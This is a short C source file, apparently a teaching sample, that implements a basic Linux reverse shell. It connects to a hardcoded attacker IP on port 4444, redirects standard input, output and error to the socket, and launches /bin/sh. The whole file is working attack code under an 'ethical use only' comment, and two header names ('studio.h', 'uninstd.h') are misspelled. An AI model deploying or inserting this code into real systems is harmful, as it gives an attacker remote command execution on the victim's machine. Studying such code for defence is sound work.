/*
	Basic reverse shell for Linux systems
Author: Whusher
Comments: This is an illustration of malicious software for ethical use only.
*/


#include <studio.h>
#include <uninstd.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <sys/socket.h>

int main(){
	//  IP  address of the adversary ---> Your attacker IP destiny
	const char* attacker_ip = "192.168.100.9";
	
	// Structure of IP address
	struct sockaddr_in target_address;
	target_address.sin_family = AF_INET;
	target_address.sin_port = htons(4444);
	inet_aton(attacker_ip, &target_address.sin_addr);
	
	// System call to create socket
	int socket_file_descriptor = socket(AF_INET, SOCK_STREAM, 0);
	
	// System call to establish a connection
	connect(socket_file_descriptor, (struct sockaddr *)&target_address, sizeof(target_address));
	
	for(int index = 0; index < 3; index++){
	    // dup2(socket_file_descriptor, 0) - link to standard input
	    // dup2(socket_file_descriptor, 1) - link to standard output
	    // dup2(socket_file_descriptor, 2) - link to standard error
	    dup2(socket_file_descriptor, index);
	}
  // System call to execute shell
  execve("/bin/sh", NULL, NULL);
  return 0;
}
